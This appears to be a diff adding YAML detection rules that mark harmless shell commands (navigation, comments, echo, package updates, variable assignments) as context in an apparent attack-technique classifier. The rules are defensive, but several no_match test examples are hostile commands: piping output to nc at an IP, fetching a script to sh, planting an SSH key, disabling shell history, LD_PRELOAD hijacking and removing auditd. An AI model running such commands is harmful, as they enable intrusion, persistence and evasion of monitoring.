@@ -1,0 +1,101 @@
+# Context comes first. Moving around, listing files, shell syntax, comments, literal variables and plain messages are
+# never an attack technique, and a line such as cd xmrig-6.21.0 or ls /opt/chisel names a tool without running it.
+#
+# A context rule claims a whole text or nothing: {quiet} (described in rules.py) holds only when every command in
+# the text is context, so cd /tmp && ./x, echo x > file and if curl ...; then are left to the rules after these, or
+# to the model. Each rule looks ahead at the first command to name its kind; the last one takes the rest. A recursive
+# dir (dir /s) is a file search, so it is left to file-discovery.
+#
+# Placeholders such as {cmd}, {end} and {quiet} are described in rules.py.
+
+- id: navigation
+  match:
+    regex: '(?i)^(?={cmd}(?:cd|pwd|clear|exit|logout|ls|ll|cls|dir|history){end}){quiet}'
+  meaning: Moves around or lists files; context, not an attack technique.
+  context: true
+  confidence: high
+  examples:
+    match: ["cd /tmp", "ls -la", "pwd", "history", "cd xmrig-6.21.0", "ls /opt/chisel", "ls -la /etc/cron.d/",
+            "cd /home/john", "sudo ls -la /root", "dir", "cd /tmp && ls", "(cd /tmp/x && ls)", "cd /tmp\nls"]
+    no_match: ["lsof -i", "history -c", "lsblk", 'dir /s /b C:\Users\*.kdbx', "cd /tmp && ./x",
+               "ls -la > /etc/cron.d/x", "cd /tmp\nwhoami", "pwd | nc 203.0.113[.]5 4444"]
+
+- id: comment
+  match:
+    regex: '^(?=[^\S\n]*#){quiet}'
+  meaning: A comment, or a script's interpreter line (#!); context, it runs nothing.
+  context: true
+  confidence: high
+  examples:
+    match: ["# example comment", "#!/bin/bash", "   # indented note", "# step 2\n# step 3"]
+    no_match: ["#!/bin/bash\ncurl -s hxxp://203.0.113[.]5/x | sh", "echo '#'", "x=1 # set x"]
+
+- id: print
+  match:
+    regex: '^(?={cmd}(?:echo|printf){end}){quiet}'
+  meaning: Prints a message; context. A message written into a file is left to the persistence and log rules.
+  context: true
+  confidence: high
+  examples:
+    match: ["echo hello", 'echo "done: $count"', "printf '%s\n' \"$*\"", 'echo "missing" >&2',
+            "echo hello > /dev/null", "ok() { printf '%s\n' \"$*\"; }", "echo \"line one\nline two\"",
+            "start) echo hello ;;"]
+    no_match: ["echo $(whoami)", "echo x > /tmp/y", "echo hello | tr a-z A-Z", "echo > /var/log/syslog",
+               "echo 'ssh-ed25519 AAAAC3Nza k' >> ~/.ssh/authorized_keys", "printf -vHISTFILE %s /dev/null",
+               "printf '-vx' %s y", "printf $fmt y", "echo ${x@P}", "echo ${!x}", "echo ${y:x}"]
+
+# Updating the package lists and upgrading what is installed. Installing named packages, even through upgrade, is a
+# signal the model should see, so it is left to the model.
+- id: package-install
+  match:
+    regex: '^(?={cmd}(?:apt|apt-get){end}){quiet}'
+  meaning: Updates the package lists or upgrades the installed packages with the system's package manager; context, no technique on its own.
+  context: true
+  confidence: medium
+  platforms: [linux]
+  examples:
+    match: ["sudo apt-get update", "apt update && apt upgrade -y", "DEBIAN_FRONTEND=noninteractive apt-get -y dist-upgrade"]
+    no_match: ["apt-get remove -y auditd", "apt-get purge -y apparmor", "sudo apt-get install -y nmap",
+               "apt upgrade nginx", "apt install -y ./x.deb", "apt-get -c /tmp/apt.conf update",
+               "APT_CONFIG=/tmp/apt.conf apt-get update", "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh",
+               "apt list --installed"]
+
+- id: container-status
+  match:
+    regex: '^(?={cmd}(?:docker|docker-compose){end}){quiet}'
+  meaning: Reads a container's logs, or Docker's version and info; context. Listing containers is discovery.
+  context: true
+  confidence: medium
+  examples:
+    match: ["docker logs web", "sudo docker logs --tail 50 web", "docker compose logs -f api", "docker version"]
+    no_match: ["docker ps", "docker images", "docker stop web", "docker run -d nginx", "docker inspect web",
+               "docker logs web | grep -i pass", "docker --config info info", "docker -H logs logs web"]
+
+- id: assignment
+  match:
+    regex: '^(?=[^\S\n]*(?:(?:local|export|readonly|declare|typeset){end}|[A-Za-z_][A-Za-z0-9_]*\+?=)){quiet}'
+  meaning: Sets a shell variable to a literal value; context.
+  context: true
+  confidence: high
+  examples:
+    match: ["x=1", 'NAME="hello world"', "local x", "local count=0", "export LANG=C", "readonly MAX=5",
+            "declare -A seen", "args=(\n  -H \"X-Example: 1\"\n  -H \"X-Other: 2\"\n)", "a=1 b=2"]
+    no_match: ["out=$(id)", "x=`id`", "target=203.0.113[.]5", "url=hxxp://203.0.113[.]5/a",
+               "host=evil.example[.]com", "export PATH=/tmp/.x:$PATH", "LD_PRELOAD=/tmp/x.so",
+               "export HISTFILE=/dev/null", "x=1 ./run", "declare -i n", "export APT_CONFIG=/tmp/apt.conf"]
+
+- id: shell-syntax
+  match:
+    regex: '^{quiet}'
+  meaning: Shell syntax or a builtin with no effect of its own (a block keyword, a test, set or shift); context.
+  context: true
+  confidence: high
+  examples:
+    match: ["fi", "done", "}", "then", "else", "esac", ";;", ")", "do", "if [ -f /tmp/example ]; then",
+            "while true; do", "for x in a b c; do", 'case "$1" in', "set -euo pipefail", "true", ":",
+            "read -r line", "start) true ;;", "check() {",
+            '[[ -z "$a" || -n "$b" ]] && { echo "missing" >&2; exit 1; }']
+    no_match: ["while read line; do", "if curl -fsS hxxp://203.0.113[.]5/ok; then", "for h in $(cat hosts); do",
+               'if [ "$(id -u)" = 0 ]; then', "set +o history", "then whoami", "(whoami)", "[[ $x -eq 0 ]]",
+               "for ((i = 0; i < 3; i++)); do", '[ -v "$x" ]', "read -r PROMPT_COMMAND", "for HISTFILE in /dev/null",
+               ": ${PROMPT_COMMAND:=/tmp/x}"]
